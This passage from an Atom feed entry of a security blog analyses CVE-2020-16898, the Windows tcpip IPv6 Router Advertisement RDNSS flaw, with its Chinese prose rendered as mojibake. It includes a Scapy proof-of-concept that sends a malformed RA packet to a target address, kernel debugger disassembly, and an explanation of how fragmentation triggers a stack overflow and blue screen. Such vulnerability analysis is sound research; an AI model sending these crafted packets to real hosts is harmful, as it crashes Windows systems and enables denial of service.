value (2).  Also, the validity of the RDNSS option is checked with</span><br><span class="line">   the &quot;Addresses of IPv6 Recursive DNS Servers&quot; field; that is, the</span><br><span class="line">   addresses should be unicast addresses.</span><br></pre></td></tr></table></figure></blockquote><p>å³ Length é•¿åº¦å­—æ®µè¦æ»¡è¶³ <code>(Length - 1) % 2 == 0</code> åˆ™ length å­—æ®µå¿…ä¸ºå¥‡æ•°ï¼Œä¸”æ˜¯å¤§äºç­‰äº3 çš„å¥‡æ•°</p><p>å‡è®¾æ­¤æ—¶ length é•¿åº¦ä¸º 3ï¼Œ åˆ™åœ°å€ä¸ªæ•°ä¸º ï¼ˆ3 - 1) / 2  == 1 ï¼Œæˆ‘ä»¬çŸ¥é“ä¸€ä¸ªåœ°å€é•¿åº¦ä¸º 16 å­—èŠ‚ã€‚IPv6 Recursive DNS Servers åœ°å€å‰çš„å­—æ®µå  8 å­—èŠ‚ï¼Œæ¯ä¸ª IPv6 Recursive DNS Servers åœ°å€é•¿åº¦ä¸º 16 ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥æ­£å¸¸çš„ RDNSS é€‰é¡¹æ€»é•¿åº¦åº”æ»¡è¶³ 16x+8ï¼ˆx&gt;=1ï¼‰ï¼Œå°†å…¶é™¤ä»¥ 8 å°±æ˜¯ 2x+1ï¼ˆx&gt;=1ï¼‰ ï¼Œä¹Ÿå°±æ˜¯ Length å­—æ®µåº”è¯¥æ»¡è¶³çš„æ¡ä»¶ã€‚ç”±äº IPv6 RDNSS åœ°å€ä¸º 16 ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥ RDNSS é€‰é¡¹æ€»é•¿åº¦ä¼šä»¥ 16 å­—èŠ‚é€’å¢ï¼Œä¸€ä¸ªæœ€å°çš„é•¿åº¦ä¸º 24ï¼ˆ8+16ï¼‰</p><h2 id="å¦‚æœ-Length-æ˜¯å¶æ•°"><a href="#å¦‚æœ-Length-æ˜¯å¶æ•°" class="headerlink" title="å¦‚æœ Length æ˜¯å¶æ•°"></a>å¦‚æœ Length æ˜¯å¶æ•°</h2><p>é€šè¿‡å­¦ä¹ åè®®ï¼Œæˆ‘ä»¬çŸ¥é“é€šå¸¸ä¸‹ï¼Œ length çš„å€¼åº”ä¸ºå¤§äºç­‰ 3 çš„å¥‡æ•°ï¼Œä½†æ˜¯å¦‚æœå½“ä¼ å…¥çš„ length ä¸ºå¶æ•° 2 ï¼Œé‚£ä¹ˆä¼šå‘ç”Ÿä»€ä¹ˆäº‹æƒ…ï¼Ÿ</p><p>æŒ‰ç…§åè®®ç†è§£ï¼Œæ­¤æ—¶ ï¼ˆ2-1ï¼‰/2 == 0 ï¼Œåˆ™ä¼šåˆ¤æ–­æ­¤ packet æ²¡æœ‰åœ°å€ï¼Œåˆ™ç†åº”ä¼šæŠŠ RDNSS é€‰é¡¹çš„æœ€å 8 ä¸ªå­—èŠ‚é”™è¯¯çš„è®¤ä¸ºç¬¬ä¸‹ä¸€ä¸ªä¸ªé€‰é¡¹çš„å‰8ä¸ªå­—èŠ‚ã€‚</p><p>ä¾‹å¦‚å‡è®¾æˆ‘ä»¬è®¾ç½® length é•¿åº¦ä¸º 4 -&gt; rdnss.len = len(rdnss.dns) * 2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc_last_8_bytes</span>(<span class="params">target_addr</span>):</span></span><br><span class="line">    ip = IPv6(dst = target_addr, src = <span class="string">&quot;fe80::250:56ff:fec0:2222&quot;</span>)</span><br><span class="line">    ra = ICMPv6ND_RA()</span><br><span class="line"></span><br><span class="line">    rdnss = ICMPv6NDOptRDNSS(lifetime=<span class="number">900</span>, dns=[<span class="string">&quot;4141:4141:4141:4141:4141:4141:4141:4141&quot;</span>,</span><br><span class="line">            <span class="string">&quot;4242:4242:4242:4242:4242:4242:4242:4242&quot;</span>])</span><br><span class="line">    <span class="comment"># We put an even value for the option length (correct length should be 5)</span></span><br><span class="line">    rdnss.len = len(rdnss.dns) * <span class="number">2</span></span><br><span class="line">    <span class="comment"># We adjust the actual option size (when &#x27;confused&#x27; is appended to it,</span></span><br><span class="line">    <span class="comment"># it must be rdnss.len * 8 bytes == 0x20 bytes long)</span></span><br><span class="line">    truncated = bytes(rdnss)[: (rdnss.len<span class="number">-1</span>) * <span class="number">8</span>]</span><br><span class="line">    <span class="comment"># The last 8 bytes of the crafted RDNSS option are interpreted as</span></span><br><span class="line">    <span class="comment"># the start of a second option</span></span><br><span class="line">    confused = <span class="string">&#x27;XXXXYYYY&#x27;</span></span><br><span class="line">    crafted = truncated + confused</span><br><span class="line"></span><br><span class="line">    send(ip/ra/crafted)</span><br><span class="line"></span><br><span class="line">poc_last_8_bytes(<span class="string">&#x27;fd15:4ba5:5a2b:1008:79f7:979d:4e:97eb&#x27;</span>)</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201020031914.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201020031914.png"></a></p><p>æˆ‘ä»¬é€‰å–ä¸Šé¢çš„ä¸€æ®µæ±‡ç¼–åšä¸€ä¸ªç®€å•çš„æ³¨é‡Š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fffff801&#96;26bca5c8 e8a39de5ff     call    tcpip!NetioAdvanceNetBuffer (fffff801&#96;26a24370)</span><br><span class="line">fffff801&#96;26bca5cd 0fb64301       movzx   eax, byte ptr [rbx+1] ; eax &#x3D; option.length</span><br><span class="line">fffff801&#96;26bca5d1 8d4e01         lea     ecx, [rsi+1]</span><br><span class="line">fffff801&#96;26bca5d4 2bc6           sub     eax, esi              ; eax &#x3D; option.length - 1</span><br><span class="line">fffff801&#96;26bca5d6 4183cfff       or      r15d, 0FFFFFFFFh</span><br><span class="line">fffff801&#96;26bca5da 99             cdq     </span><br><span class="line">fffff801&#96;26bca5db f7f9           idiv    eax, ecx              ; eax &#x3D; (option.length - 1) &#x2F; 2</span><br><span class="line">fffff801&#96;26bca5dd 8b5304         mov     edx, dword ptr [rbx+4]</span><br><span class="line">fffff801&#96;26bca5e0 8945b7         mov     dword ptr [rbp-49h], eax</span><br><span class="line">fffff801&#96;26bca5e3 8bf0           mov     esi, eax</span><br><span class="line">fffff801&#96;26bca5e5 413bd7         cmp     edx, r15d</span><br></pre></td></tr></table></figure><p>å³è¿™æ–­ä»£ç åœ¨åšè®¡ç®— åœ°å€æ•° <code>(4 - 1) / 2 == 1</code>. å› è€Œä¼šå°† NET_BUFFER å‰è¿› 24 ä¸ªå­—èŠ‚ï¼ˆ3*8ï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; u rip</span><br><span class="line">tcpip!Ipv6pUpdateRDNSS+0xa9:</span><br><span class="line">fffff801&#96;26bca5dd 8b5304          mov     edx,dword ptr [rbx+4]</span><br><span class="line">fffff801&#96;26bca5e0 8945b7          mov     dword ptr [rbp-49h],eax</span><br><span class="line">fffff801&#96;26bca5e3 8bf0            mov     esi,eax</span><br><span class="line">fffff801&#96;26bca5e5 413bd7          cmp     edx,r15d</span><br><span class="line">fffff801&#96;26bca5e8 7412            je      tcpip!Ipv6pUpdateRDNSS+0xc8 (fffff801&#96;26bca5fc)</span><br><span class="line">fffff801&#96;26bca5ea 0fca            bswap   edx</span><br><span class="line">fffff801&#96;26bca5ec 8d0c12          lea     ecx,[rdx+rdx]</span><br><span class="line">fffff801&#96;26bca5ef 8bc1            mov     eax,ecx</span><br><span class="line">0: kd&gt; rax</span><br><span class="line">ax&#x3D;1</span><br></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬è®©ç¨‹åºèµ°åˆ°ä¸‹ä¸€ä¸ªå–ä¸‹ä¸€ä¸ªé€‰é¡¹çš„æ—¶å€™ï¼Œå‘ç°ï¼Œæ­¤æ—¶çš„é€‰é¡¹çš„å‰8ä¸ªå­—èŠ‚å¯è¢«ä¼ªé€ </p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201020033744.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201020033744.png"></a></p><h2 id="å¦‚ä½•é€ æˆæ ˆæº¢å‡ºçš„ï¼Ÿ"><a href="#å¦‚ä½•é€ æˆæ ˆæº¢å‡ºçš„ï¼Ÿ" class="headerlink" title="å¦‚ä½•é€ æˆæ ˆæº¢å‡ºçš„ï¼Ÿ"></a>å¦‚ä½•é€ æˆæ ˆæº¢å‡ºçš„ï¼Ÿ</h2><p>æˆ‘ä»¬çŸ¥é“æ­¤æ—¶å¯ä»¥ä¼ªé€ å‰ 8ä¸ªå­—èŠ‚ï¼Œé‚£ä¹ˆæ ¹æ® type å¯ä»¥èµ°ä¸åŒçš„ç¨‹åºæµ</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201020034837.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201020034837.png"></a></p><p>æ ¹æ®äº¤å‰å¼•ç”¨ï¼Œä»¥åŠæ–‡æ¡£æ­¤æ—¶çš„å‡½æ•°æœ‰ ä¸‰ç§ typeï¼Œåˆ†åˆ«ä¸º</p><p>3ï¼š break ï¼Œä¼¼ä¹æ˜¯æ­£å¸¸æ¶ˆæ¯</p><p>24ï¼šRoute Information Option</p><p>25ï¼šRDNSS Option ï¼ˆ<a href="https://tools.ietf.org/html/rfc4191#section-2.3%EF%BC%89">https://tools.ietf.org/html/rfc4191#section-2.3ï¼‰</a></p><p>å…¶ä¸­ 25 æ˜¯æˆ‘ä»¬è§¦å‘æ¼æ´çš„åœ°æ–¹ï¼Œ é‚£ä¹ˆå¯åˆ©ç”¨çš„ä¼¼ä¹åªæœ‰ 24 äº†</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201021004542.png" title="image-20201021004540686" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201021004542.png" alt="image-20201021004540686"></a></p><p>å½“ type ä¸º 24 çš„æ—¶å€™ï¼Œä¼šè°ƒç”¨ <code>NdisGetDataBuffer</code> è¯¥å‡½æ•°ï¼Œæˆ‘ä»¬å‘ç°æ­¤å‡½æ•°çš„ v221 å€¼åœ¨æ ˆä¸Šï¼Œ Elenä¸ºå¯æ§çš„é•¿åº¦ * 8</p><p><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ndis/nf-ndis-ndisgetdatabuffer">https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ndis/nf-ndis-ndisgetdatabuffer</a></p><p>æœç´¢å¾®è½¯æ–‡æ¡£æˆ‘ä»¬å‘ç°è¯¥å‡½æ•°åŸå‹å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">PVOID NdisGetDataBuffer(</span><br><span class="line">  PNET_BUFFER NetBuffer,</span><br><span class="line">  ULONG       BytesNeeded,</span><br><span class="line">  PVOID       Storage,</span><br><span class="line">  UINT        AlignMultiple,</span><br><span class="line">  UINT        AlignOffset</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>å…¶ç¬¬ä¸€ä¸ªå‚æ•° NetBuffer ä¸ºä¸€ä¸ªæŒ‡å‘ NET_BUFFER ç»“æ„çš„æŒ‡é’ˆï¼›ç¬¬äºŒä¸ªå‚æ•° BytesNeeded ä¸ºè¯·æ±‚æ•°æ®çš„é•¿åº¦ï¼›ç¬¬ä¸‰ä¸ªå‚æ•° Storage ä¸ºæŒ‡å‘ç¼“å†²åŒºçš„æŒ‡é’ˆï¼Œå¦‚æœè°ƒç”¨è€…ä¸æä¾›ç¼“å†²åŒºï¼Œåˆ™ä¸º NULLã€‚å¦‚æœæ­¤å€¼é NULL ä¸”è¯·æ±‚çš„æ•°æ®ä¸è¿ç»­ï¼Œåˆ™ NDIS ä¼šå°†è¯·æ±‚çš„æ•°æ®å¤åˆ¶åˆ° Storage æŒ‡å‘çš„ç¼“å†²åŒºã€‚</p><p>NdisGetDataBuffer å‡½æ•°è¿”å›æŒ‡å‘è¿ç»­æ•°æ®çš„æŒ‡é’ˆï¼Œæˆ–è€…NULLã€‚å¦‚æœç¼“å†²åŒºä¸­è¯·æ±‚çš„æ•°æ®æ˜¯è¿ç»­çš„ï¼Œåˆ™è¿”å›å€¼æ˜¯æŒ‡å‘ NDIS æä¾›çš„ä½ç½®çš„æŒ‡é’ˆã€‚å¦‚æœæ•°æ®ä¸è¿ç»­ï¼Œåˆ™æ ¹æ® Storageå‚æ•°æ¥åˆ¤æ–­ï¼š</p><ul><li>å¦‚æœ Storage å‚æ•°ä¸ºé NULLï¼Œå³æŒ‡å®šç¼“å†²åŒºæŒ‡é’ˆï¼Œåˆ™ NDIS å°†æ•°æ®å¤åˆ¶åˆ°Storage æŒ‡å‘çš„ç¼“å†²åŒºä¸­ï¼Œè¿”å›å€¼ä¸º Storageå‚æ•°æŒ‡é’ˆ ã€‚</li><li>å¦‚æœ Storage å‚æ•°ä¸º NULLï¼Œåˆ™è¿”å›å€¼ä¸º NULLã€‚</li></ul><p>æ‰€ä»¥æˆ‘ä»¬è¦é€šè¿‡æ­¤å‡½æ•°è§¦å‘ç¼“å†²åŒºæº¢å‡ºï¼Œåˆ™éœ€è¦æ„é€ ä¸€ä¸ªéè¿ç»­çš„çš„æ•°æ®åŒ…ï¼Œè¿™ä¸ªé—®é¢˜çš„è§£å†³æ–¹æ¡ˆæ˜¯æ„é€ ä¸€ä¸ª â€œç¢ç‰‡åŒ–â€ çš„æ•°æ®ã€‚å¯¹ IPv6 æ•°æ®è¿›è¡Œåˆ†æ®µåˆ™å¯ä»¥ã€‚</p><p>å¦‚æœæˆ‘ä»¬å‘é€å¸¦æœ‰ç•¸å½¢çš„RDNSSé€‰é¡¹çš„Router Advertisementæ•°æ®åŒ…æ—¶ï¼Œå°†å…¶åˆ†å‰²æˆè‹¥å¹²ä¸ªIPv6ç¢ç‰‡ï¼Œé‚£ä¹ˆé‡æ–°ç»„åˆçš„æ•°æ®åŒ…æ•°æ®å°±ä¼šä»¥éè¿ç»­çš„æ–¹å¼å­˜å‚¨åœ¨NET_BUFFERä¸­ã€‚è¿™æ ·ä¸€æ¥ï¼Œå¯¹NdisGetDataBufferçš„è°ƒç”¨å°±ä¼šä»æˆ‘ä»¬çš„æ•°æ®åŒ…ä¸­å¤åˆ¶ä»»æ„æ•°é‡çš„å­—èŠ‚åˆ°å †æ ˆä¸­çš„å›ºå®šå¤§å°çš„ç¼“å†²åŒºä¸­ï¼Œå¯¼è‡´åŸºäºå †æ ˆçš„ç¼“å†²åŒºæº¢å‡ºï¼Œä½¿å¾—æˆ‘ä»¬å¯ä»¥ç”¨ä»»æ„çš„å€¼è¦†ç›–tcpipï¼Ipv6pHandleRouterAdvertisementçš„è¿”å›åœ°å€ã€‚</p><p>å¦å¤–è¿™é‡Œè¦æœ‰ç¨‹åºæœ‰ä¸€ä¸ªæ£€æŸ¥ï¼Œå®ƒå…è®¸è·¯ç”±ä¿¡æ¯é€‰é¡¹çš„æœ€å¤§å®é™…å¤§å°ï¼ˆoption.Length * 3ï¼‰ä¸º0x18ã€‚</p><p>å³åœ¨ä¸€ä¸ªå¾ªç¯éå†æ‰€æœ‰headersï¼Œåšä¸€äº›åŸºæœ¬çš„éªŒè¯</p><p>å¦‚å›¾ï¼ŒIpv6pHandleRouterAdvertisement å‡½æ•°ä¸­ä¼šæ£€æŸ¥ Route Information é€‰é¡¹ä¸­çš„ Length æ˜¯å¦å¤§äº 3 ï¼Œå¦‚æœå¤§äº 3 å°±ä¼šè¿›å…¥é”™è¯¯æµç¨‹ï¼Œç„¶åå¿½ç•¥è¿™ä¸ªåŒ…çš„ã€‚</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201021003351.png" title="image-20201021003350639" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201021003351.png" alt="image-20201021003350639"></a></p><p>åœ¨æ”»å‡»çš„è¿‡ç¨‹ä¸­</p><p>Route Information é€‰é¡¹çš„å‰ 8 ä¸ªå­—èŠ‚è¢«åµŒåˆ°äº†ç¬¬ä¸€ä¸ª Recursive DNS Server é€‰é¡¹çš„æœ«å°¾ã€‚ç”±äºåœ¨ Case 0x19 çš„æ£€æŸ¥æµç¨‹ä¸­ï¼Œåªåˆ¤æ–­äº† Length æ˜¯å¦å°äº 3 ï¼Œè€Œæ²¡æœ‰åˆ¤æ–­è¯¥å­—æ®µæ˜¯å¦æ˜¯å¶æ•°å€¼ï¼Œå¯å¯¼è‡´åœ¨å¯¹æ•°æ®åŒ…é€‰é¡¹è¿›è¡Œæ£€æŸ¥çš„æ—¶å€™å°†ç¬¬ä¸€ä¸ª Recursive DNS Server é€‰é¡¹é•¿åº¦è¯¯å½“æˆ 0x20ï¼Œå› æ­¤æ£€æŸ¥æ˜¯é€šè¿‡çš„ã€‚è€Œåœ¨çœŸæ­£å¤„ç†çš„è¿‡ç¨‹ä¸­ï¼Œåˆå°†å…¶é•¿åº¦è§£æä¸º 0x18</p><p>å¯¹äºtypeä¸º0x18ä¼šè¿›å…¥ä¸‹é¢çš„æµç¨‹å¤„ç†ï¼Œè°ƒç”¨NdisGetDataBufferå‡½æ•°ï¼Œå…¶ä¸­ç¬¬äºŒä¸ªå‚æ•°ä¸ºé•¿åº¦çš„å®é™…å­—èŠ‚å¤§å°ï¼Œç­‰äºlength<em>8ï¼Œæ‰€ä»¥æ­¤æ—¶ä¼ å…¥çš„actual_length_bytes = 0x22</em> 8 = 0x110ï¼š</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201021004542.png" title="image-20201021004540686" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201021004542.png" alt="image-20201021004540686"></a></p><p>è€ŒStorage_1 ä¸ºæ ˆä¸Šçš„æ•°ç»„å˜é‡ï¼Œå°†0x110ä¸ªå­—èŠ‚èµ‹å€¼è¿‡å»ï¼Œå°±ä¼šé€ æˆæ ˆä¸Šçš„æº¢å‡ºï¼Œå®é™…çš„å´©æºƒæ˜¯æº¢å‡ºè¦†ç›–äº†stack cookieï¼Œè§¦å‘tcpip!_security_check_cookieï¼Œé€ æˆè“å±ï¼ˆBSODï¼‰ï¼š</p><p>æœ€åè´´ä¸€ä¸ªè“å±ï¼š</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201020040544.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201020040544.png"></a></p><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="https://blog.quarkslab.com/beware-the-bad-neighbor-analysis-and-poc-of-the-windows-ipv6-router-advertisement-vulnerability-cve-2020-16898.html">https://blog.quarkslab.com/beware-the-bad-neighbor-analysis-and-poc-of-the-windows-ipv6-router-advertisement-vulnerability-cve-2020-16898.html</a></p><p><a href="http://site.pi3.com.pl/exp/p_CVE-2020-16898.py">http://site.pi3.com.pl/exp/p_CVE-2020-16898.py</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="æ¼æ´åˆ†æ" scheme="https://bestwing.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="CVE-2020-16898" scheme="https://bestwing.me/tags/CVE-2020-16898/"/>
    
  </entry>
  
</feed>
